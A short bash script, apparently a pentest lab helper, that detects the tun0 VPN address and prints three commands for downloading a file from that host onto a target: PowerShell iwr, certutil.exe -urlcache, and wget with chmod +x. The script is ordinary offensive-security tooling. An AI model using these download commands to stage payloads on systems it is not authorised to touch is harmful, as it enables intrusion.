#!/bin/bash

# Define color codes ${PINK} for PINK and ${NC} to NC
PINK='\033[38;2;255;105;180m'  # Pink RGB color
NC='\033[0m'                   # No Color (NC)

# Default values
default_port=80
default_file="file"
default_ip=$(ip -4 addr show dev tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')  # Detects the IP address of tun0

# Function to print commands
print_commands() {
    local port=$1
    local file=$2
    local ip=$3

    echo "1. ${PINK}iwr -uri http://$ip:$port/$file -o $file ${NC}"
    echo "2. ${PINK}certutil.exe -urlcache -split -f http://$ip/$file C:\\Windows\\temp\\$file ${NC}"
    echo "3. ${PINK}wget http://$ip:$port/$file && chmod +x $file ${NC}"
}

# Parse command line arguments
while getopts "p:f:i:" opt; do
    case ${opt} in
        p )
            port=$OPTARG
            ;;
        f )
            file=$OPTARG
            ;;
        i )
            ip=$OPTARG
            ;;
        \? )
            echo "Usage: $0 [-p port] [-f file] [-i ip]"
            exit 1
            ;;
    esac
done

# Set default values if not set
port=${port:-$default_port}
file=${file:-$default_file}
ip=${ip:-$default_ip}

# Check if the IP was successfully detected
if [ -z "$ip" ]; then
    echo "Error: Could not determine the IP address for tun0."
    exit 1
fi

# Print the commands
print_commands "$port" "$file" "$ip"
